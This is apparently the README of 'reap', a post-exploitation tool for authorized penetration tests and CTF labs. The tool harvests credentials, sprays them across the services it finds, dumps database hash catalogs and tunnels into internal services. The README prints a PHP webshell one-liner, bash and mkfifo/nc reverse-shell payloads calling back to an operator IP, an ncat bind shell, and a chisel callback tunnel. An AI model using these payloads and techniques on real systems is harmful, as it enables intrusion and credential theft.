# reap

```
██████╗ ███████╗ █████╗ ██████╗
██╔══██╗██╔════╝██╔══██╗██╔══██╗
██████╔╝█████╗  ███████║██████╔╝
██╔══██╗██╔══╝  ██╔══██║██╔═══╝
██║  ██║███████╗██║  ██║██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝
```

Post-exploitation loot collection and credential-reuse testing for authorized engagements (penetration tests, HTB/CTF labs).

You get the foothold. reap attaches to it and does the tedious part: it enumerates the host for secrets, configs, keys, and privilege-escalation signals, tests every credential it finds against every service it finds, and gives you a ranked findings list plus a report. It does not exploit anything and it does not decide your pivots — those stay with you.

> reap only tests credentials against services on hosts you register. No external spraying, no targets you didn't provide. Use it on systems you are authorized to assess.

## Install

reap installs from source. On Kali:

```bash
git clone https://github.com/Cobrastrike62/reap.git ~/reap
cd ~/reap
./install.sh --full          # local .venv + all optional backends
source .venv/bin/activate
reap
```

**Prefer a global command** with no venv to activate? Install via pipx — it puts an editable `reap` on your `PATH`:

```bash
sudo apt install -y pipx && pipx ensurepath   # once; then open a new shell
```

```bash
cd ~/reap && bash install.sh --pipx --full    # global editable reap + all backends
```

(`--pipx` and `--full` are independent — `--pipx` makes it global, `--full` chooses the backends. Add `--trusted-host` behind a TLS-intercepting proxy.)

`install.sh` flags (combine freely):

| flag | effect |
|---|---|
| `--full` | all optional backends (DB logins + SMB/pass-the-hash + GPP decrypt) |
| `--db` | database login backends only (mysql / postgres / mongo / mssql) |
| `--win` | Windows/AD backends only (impacket + cryptography) |
| `--pipx` | install as a global, editable command via pipx (no venv to activate) |
| `--with-pwncat` | also set up pwncat-vl in its own venv |
| `--trusted-host` | pass pip `--trusted-host`, for TLS-intercepting proxies |

The optional backends are only used for credential *testing* against those services; reap collects loot without them. Run `./install.sh --help` for the full list.

## Quickstart

```
reap --db engagement.db                       # a named store that persists across hosts

reap> register ssh 10.10.10.5 bob 'S3cret!'   # attach to your foothold (auto-fingerprints)
reap> enum                                     # survey the box (processes/cron/services/net)
reap> run                                      # collect loot, then correlate
reap> creds                                    # recovered credentials + confirmed reuse
reap> findings                                 # ranked findings (capabilities first)
reap> !ls -la /root                            # run a command on the target ( or: interact )
reap> report engagement.md                     # write the report
```

Pivoting? `register` the next host too. The loot store persists, so a credential found on one box is tested against every other box you register.

## How it works

reap is built in layers, each depending only on the one below it:

```
Console        register / enum / run / correlate / forward / shell / report
Correlation    credential reuse (incl. pass-the-hash) + capability findings + DB credential-catalog dump
Modules        fingerprint + collection primitives + per-runtime plugins
Loot store     SQLite: hosts, services, credentials, findings
Transport      SSH / WinRM / webshell / pwncat handoff  (one exec contract)
```

Modules never see the transport. They run over a single `Session.exec()` contract, so the same collection works whether the session is SSH, WinRM, a webshell, or a handed-off pwncat shell.

Correlation also **closes the DB loop**: when a discovered credential is confirmed against a MySQL/Postgres/MSSQL/Mongo service, reap reuses that proven login to read the database's own credential catalog (`mysql.user`, `pg_shadow`, `sys.sql_logins`, mongo `system.users`), storing every account hash — tagged with its hashcat mode — as new loot for offline cracking. It reads only the auth catalog, not application data, and you can disable it with `REAP_NO_DBDUMP=1`.

## Attaching to a foothold

Pick the adapter that matches the access you already have:

| Access | Register with |
|---|---|
| SSH password or key | `register ssh <ip> <user> [<pass>] [--key PATH] [--port N]` |
| WinRM | `register winrm <ip> <user> <pass> [--ssl] [--port N]` |
| Web / command-injection RCE | `register webshell <url> [--param NAME] [--method GET\|POST] [--shell sh\|cmd]` |
| Raw reverse shell (nc-style) | `register listen <port>`, then fire your payload — reap catches it |
| Raw bind shell | `register bind <host> <port>` |

### Using a web shell (HTTP RCE)

The `webshell` adapter turns an HTTP command-execution foothold into a full reap session — no reverse shell required. Every module runs over it unchanged, because it honors the same `exec` contract: reap sends each command as one HTTP request and reads stdout from the response body. Exit codes are recovered from an appended high-entropy sentinel, so a truncated response or a dead shell is reported as a failure rather than a fake success.

Reach for it when your foothold is an **uploaded webshell** (arbitrary file upload into a PHP/JSP/ASPX app) or a **command-injection** endpoint (a page that executes a request parameter). Plant a minimal shell through your RCE, somewhere web-served:

```php
// PHP — the classic; JSP/ASPX equivalents work the same (any page that runs a request param)
<?php system($_REQUEST["cmd"]); ?>
```

Then register the URL and `run` as usual:

```
reap> register webshell http://target/uploads/sh.php
  registered webshell:target (active)
reap> run
```

Flags, when the shell isn't a POSIX `?cmd=` POST:

| Flag | Meaning | Default |
|---|---|---|
| `--param NAME` | the request parameter your shell reads | `cmd` |
| `--method GET` | send via query string instead of POST | `POST` |
| `--shell cmd` | Windows/IIS shell — exit-code wrapper uses `%errorlevel%`, not `$?` | `sh` |

```
reap> register webshell 'http://target/cmd.aspx' --param c --shell cmd     # IIS / ASP.NET
reap> register webshell 'http://target/vuln.php?x=' --param x --method GET  # GET injection
```

Things worth knowing:

- **TLS is not verified** (like `curl -k`) — target webshells are almost always self-signed or IP-based.
- **The web user is usually nologin** (`www-data`, `iis apppool`). That is exactly the case this adapter exists for: reap loots the host over the RCE, then correlation surfaces the credential that gets you a real interactive shell.
- **One request per command**, so a broad sweep can drag under PHP per-request time limits. For large runs prefer the driver: `python reap_run.py 'webshell:http://target/sh.php' engagement.db` (or `webshell:GET:cmd:http://target/sh.php` to set method/param).
- **Don't point it at a blocking shell** — it expects request/response, not a webshell that pipes into a reverse connection.

### Catching a raw shell

Raw shells are driven with sentinel-wrapped commands over the socket (no PTY, so no interactive prompts). reap only runs commands that return, so collection works fine; for stability-sensitive work, upgrade to SSH. Add `--shell cmd` for a Windows `cmd.exe` shell.

reap can be the listener itself — you don't need a separate `nc`. Register the listener *first*, then fire your reverse-shell payload from the target through whatever RCE you have:

```
reap> register listen 4444
  listening on 0.0.0.0:4444 — fire your reverse shell now...
```

Then, on the target (`10.10.14.5` is *your* attacking/VPN IP, `4444` the port you're listening on):

```bash
# Linux, /dev/tcp (bash):
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
# Linux, no /dev/tcp:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```

reap catches the connection, auto-fingerprints it, and you `run` as usual — it loots over the caught shell.

For a **bind** shell (the target listens, reap dials in):

```bash
# on the target, e.g. via your RCE:
ncat -lvp 1337 -e /bin/bash          # or the exploit itself opens the port
```
```
reap> register bind 10.10.10.5 1337
```

Windows `cmd.exe` reverse/bind shell: add `--shell cmd` (e.g. `register listen 4444 --shell cmd`).

## Looking around the box

Once a session is registered you have two ways to work the host by hand, both from the reap prompt over the session you already hold: `enum` to survey it, and `!` / `interact` to run commands on it.

### `enum` — enumeration, linpeas-style

`enum` surveys the active session, **flags what looks out of place**, and prints the full picture to the screen. It covers:

| Category | Collector | What you get |
|---|---|---|
| Processes | `processes` | full process list (kernel threads filtered), so you can spot creds on command lines and root-owned processes running out of writable paths |
| Cron / scheduled jobs | `cron_jobs` | every source: `/etc/crontab`, `/etc/cron.d`, the hourly/daily/weekly/monthly run-parts dirs, per-user crontabs, the spool, and `systemd` timers |
| Services | `init_services` | running services, enabled-at-boot services, and the SysV/`init.d` fallback |
| Privilege escalation | `sudo_privesc` | `sudo -l` NOPASSWD rules, non-standard SUID (GTFOBins candidates), dangerous file capabilities, writable cron files |
| Files & permissions | `interesting_files` | writable `$PATH` dirs, **root-owned files you can write / are group-writable in your group / sit in a dir you can write**, readable SSH private keys, world-writable, files you own in system locations |
| System & network | `system_snapshot` | kernel, distro, uptime, sudo version, `PATH`, users, **dangerous group membership + container / docker-socket access**, interfaces, routes, **listening sockets**, established connections, ARP, DNS |
| Windows | `windows_enum` | services (logon account + binary path), scheduled tasks, and processes with full command lines |

Each section leads with a **⚑ worth a look** block — the items reap thinks are *out of place*, each with a one-line reason — followed by the full raw listing (dimmed, for completeness). At the end, `enum` prints a **summary** of everything flagged across every section, split into *worth acting on* (red) and *worth a look* (yellow), so you get a punch-list instead of a wall of text.

The heuristic doing most of the work: anything running from — or referencing — a path **outside the base system** (`/opt`, `/home`, `/srv`, `/usr/local`, `/tmp` …). That's where the target app, an operator's custom daemon, or a dropped payload lives, while the distro's own files sit in `/usr`,`/bin`,`/sbin`,`/lib`. On top of that it flags:

- **root-owned things you can influence** — a root file you can write, one that's *group-writable and you're in the group*, or one sitting in a *directory you can write* (rename it away, drop your own). Writable `/etc/passwd` / `/etc/shadow` / `/etc/sudoers` are called out loudly.
- **a fast path via your groups** — membership in `docker`, `lxd`, `disk`, `shadow`, `sudo`/`wheel`, `adm`; a **writable `docker.sock`**; or the fact that you're **in a container** (with escape hints).
- **privesc signals** — `sudo -l` NOPASSWD, non-standard SUID (GTFOBins), dangerous capabilities, writable cron.
- **the rest** — secrets on command lines, operator/attacker tools (`nc`, `socat`, `tmux`, `tcpdump` …), vulnerable `sudo` (Baron Samedit &c.), the kernel (with a `searchsploit` pointer), extra UID-0 accounts, writable `$PATH` dirs, readable SSH private keys, and loopback / exposed services.

```
reap> enum
──────────────── Privilege context (groups / container) ───────────
⚑ worth a look:
  ! member of group 'docker'  — docker group → mount the host fs as root via a container
──────────────────────────── Processes ────────────────────────────
⚑ worth a look:
  ! www-data 1841 node /opt/app/server.js --db-pass hunter2  — secret on the command line
  full listing:
  root 1 /sbin/init  … (dimmed full ps output) …
────────────── Root-owned files writable via your group ───────────
⚑ worth a look:
  ! /opt/app/shared/config.rb  — root-owned & group-writable via your 'devs' group
─────────────────────────────── System ───────────────────────────
⚑ worth a look:
  ! Sudo version 1.8.21p2  — CVE-2021-3156 'Baron Samedit' heap overflow → root
  • kernel 5.15.0-generic  — check 'searchsploit linux kernel 5.15' for a local-root exploit
──────────────────── enum summary — 5 thing(s) stood out ──────────
! worth acting on (4):
   member of group 'docker' (Privilege context) — mount the host fs as root via a container
   www-data 1841 node /opt/app/... (Processes) — secret on the command line
   /opt/app/shared/config.rb (…your group) — root-owned & group-writable via 'devs'
   Sudo version 1.8.21p2 (System) — CVE-2021-3156 'Baron Samedit' → root
• worth a look (1):
   kernel 5.15.0-generic (System) — check 'searchsploit linux kernel 5.15'
```

Narrow it to one area by passing a filter that matches a collector name:

```
reap> enum cron        # just the cron sources
reap> enum proc        # just processes
reap> enum system      # kernel, users, and the network sections (system_snapshot)
```

**`enum` is screen-only — nothing it prints is written to the loot store**, so it never clutters `findings`. The point is to read the room. Looting the room is `run`'s job: the same collectors, run as part of `run`, quietly persist only the **actionable** subset as ranked findings —

- a secret on a process / cron / service command line → a **credential** (and it's fed straight into correlation);
- a **writable** `systemd` unit file, a writable binary named in an `ExecStart=`, or a writable file a cron job executes → a **high** misconfig (classic privesc);
- a writable directory in `$PATH`, or a **root-owned file you can write** → a **high** misconfig;
- an unquoted Windows service path with a space → a **medium** misconfig.

So in the sample above, `enum` just shows you the `deploy` process; `run` turns that `--db-pass hunter2` into a stored credential that correlation then sprays against every service it knows about.

The permission sweep (`interesting_files`) is **scoped and fast** by default — a curated set of roots plus `$PATH`, pruning the pseudo-filesystems. It focuses on what *you* can write, because "writable by root" is meaningless (root writes everything) and "owned by root" is most of the disk; the escalation gold is the intersection — a root-owned file the current user can write. Set `REAP_ENUM_FULLFS=1` to sweep the entire tree like linpeas (slower and noisier — think twice over a raw shell or webshell). Running as root the sweep is skipped, since every path is writable anyway.

Unlike the opt-in LinPEAS/WinPEAS wrappers, `enum` needs **nothing on disk** — no binary to upload, drop, or clean up. It runs over the same `exec` channel as everything else, so it works identically over SSH, WinRM, a webshell, or a caught raw shell.

### `ports` — every listening socket, reliably

`ports` lists every local listener on the target. It unions **`ss`**, **`netstat`**, and **`/proc/net/{tcp,tcp6,udp,udp6}`** and dedupes — so a live service is found even on a stripped box where neither `ss` nor `netstat` is installed. That missing fallback is exactly why a running service on `:3000` could look like it didn't exist. `/proc/net` is always present on Linux, needs no root, and is the same table `ss` itself reads: if a socket is listening, this finds it.

```
reap> ports
                Listening sockets — ssh:bob@10.10.10.5:22
 L4    Port   Bind                    Service    Process
 tcp   22     0.0.0.0                  ssh        sshd
 tcp   3000   127.0.0.1  (loopback)    http       node
 tcp   5432   127.0.0.1  (loopback)    postgres   postgres
 2 loopback-only — reach with 'forward 127.0.0.1 <port>' (run auto-forwards DB/SSH/etc.)
```

Loopback-only listeners (a dev server or DB bound to `127.0.0.1`) are flagged, because those are the ones you can't reach from your box until you `forward` them — and `run` auto-forwards the correlate-able ones. The same listener set feeds the `listening_services` collector, so every port also becomes a Service the correlation engine tests credentials against.

### `!<cmd>` and `interact` — a shell on the target

You're shelled into the box; sometimes you just want to `ls`, `cd`, and `cat` around without leaving reap. Two ways:

**One-off** — prefix any command with `!` (or `shell`). It runs on the active session and prints the output:

```
reap> !id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
reap> !cat /etc/passwd
reap> !find / -perm -4000 -type f 2>/dev/null
```

**Interactive** — `interact` drops you into a remote prompt where you type commands normally until you `exit` (or press Ctrl-D):

```
reap> interact
interacting with ssh:bob@10.10.10.5:22 — 'exit' or Ctrl-D returns to reap. (line-based; no PTY)
10.10.10.5:~$ cd /var/www/html
10.10.10.5:/var/www/html$ ls
config.php  index.php  uploads
10.10.10.5:/var/www/html$ grep -i pass config.php
$db_pass = 'S3cr3tDBpw!';
10.10.10.5:/var/www/html$ exit
reap>
```

Notice the prompt tracked the directory across commands. reap keeps a **virtual working directory per session**, so `cd` persists — even over SSH, whose `exec` channel is otherwise a fresh shell on every command (a naive `cd` would be forgotten the moment it returned). A `cd` into a directory that doesn't exist is rejected and leaves your current directory unchanged. The same cwd is shared by `!` one-offs and `interact`.

It's **line-based, with no PTY**: send-a-command, read-the-output. Programs that need a terminal — `top`, `vi`/`nano`, an interactive `sudo` password prompt, `ssh` — won't work. For those, stabilize the shell in pwncat-vl and drop your key. Everything that runs and returns (the 99% you actually use for looking around) works fine. Type an unknown command at the `reap>` prompt and it'll remind you to prefix it with `!` or use `interact`.

## Commands

| command | description |
|---|---|
| `register <adapter> …` | attach to a foothold and fingerprint it |
| `sessions` / `use <id>` / `hosts` | list sessions / switch the active one / list discovered hosts |
| `fingerprint [id]` | re-probe OS, privilege, runtimes |
| `run [id]` | collect loot, then correlate |
| `enum [filter]` | linpeas-style survey (processes/cron/services/network/kernel); screen-only |
| `ports` | every local listening socket (ss + netstat + `/proc/net` union — found even with no ss/netstat); flags loopback-only |
| `!<cmd>` / `shell <cmd>` / `interact` | run commands on the target — one-off, or a line-based remote shell (`cd` persists) |
| `correlate` | re-test credentials against services (incl. pass-the-hash); on a confirmed DB login, dump its credential catalog to loot |
| `forward <rhost> <rport> [lport]` | tunnel a target-internal service to localhost over the SSH session |
| `forwards` / `unforward <lport>` | list / close port forwards |
| `creds` | credentials and their verified reuse |
| `findings` (alias `loot`) | ranked findings |
| `search <regex>` / `note <id> <text>` | search findings / annotate one for the report |
| `report [file] [redact]` | write findings and timeline to markdown (`redact` masks secrets) |
| `export <creds\|targets\|json> [path]` | credential lists, target lists, or JSON |
| `import <nmap.xml>` | seed services from an nmap scan |
| `modules` | which modules match the active context |

## Reaching internal services

Services bound to a target's localhost — a database, an admin panel, a second SSH — aren't reachable from your machine. reap tunnels to them over the session it already holds:

```
reap> forward 127.0.0.1 3306          # the foothold's own loopback MySQL
reap> forward 10.10.20.50 22 2222     # a second host, only reachable from the foothold
reap> forwards                         # list active tunnels;  unforward <port> closes one
reap> correlate                        # tests discovered creds against the forwarded service
```

The forwarded local port is registered as a service, so `correlate` and any adapter reach it. On `run`, reap also **auto-forwards** loopback-bound databases and services it discovers. How the tunnel is built depends on the session:

- **SSH** — in-process, via paramiko `direct-tcpip` (like `ssh -L`, no second terminal).
- **Raw reverse/bind shell** — a raw shell is a single command channel and can't multiplex TCP, so reap stands up a **chisel reverse tunnel**: it runs a chisel server on your box and, through the shell, has the target fetch chisel and run a client that dials **back out** to you (so the target's firewall doesn't block it). Needs `chisel` on your box (`apt install chisel`, or `REAP_CHISEL=/path`), `wget`/`curl` on the target, and — if reap guesses the callback IP wrong — `REAP_LHOST=<your-ip>`.

## Extending

A new runtime is a plugin file, plus optionally an entry in `reap/data/known_filenames.txt`. Nothing else changes.

```python
# reap/modules/plugins/myapp.py
from ..base import Module, register
from ...patterns import scan_line


@register
class MyAppPlugin(Module):
    name = "myapp_plugin"

    def triggers(self, ctx):
        return ctx.os == "linux" and ctx.has_runtime("python")

    def collect(self, session):
        out = session.exec("cat /etc/myapp/secrets.conf 2>/dev/null").stdout
        return scan_line(out, "/etc/myapp/secrets.conf")
```

Drop the file in `reap/modules/plugins/` and it's picked up on the next `run`. Offline tests run with `pytest -q`.

## Layout

```
reap/
  transport/   session adapters (ssh, winrm, webshell, pwncat) + local forwarding
  store/       SQLite schema and loot store
  modules/     collection primitives, runtime plugins, enumeration wrappers
  data/        known-filename list (data, not code)
  fingerprint.py  correlation.py  reporter.py  console.py  patterns.py
```

## License

MIT — see [LICENSE](LICENSE).
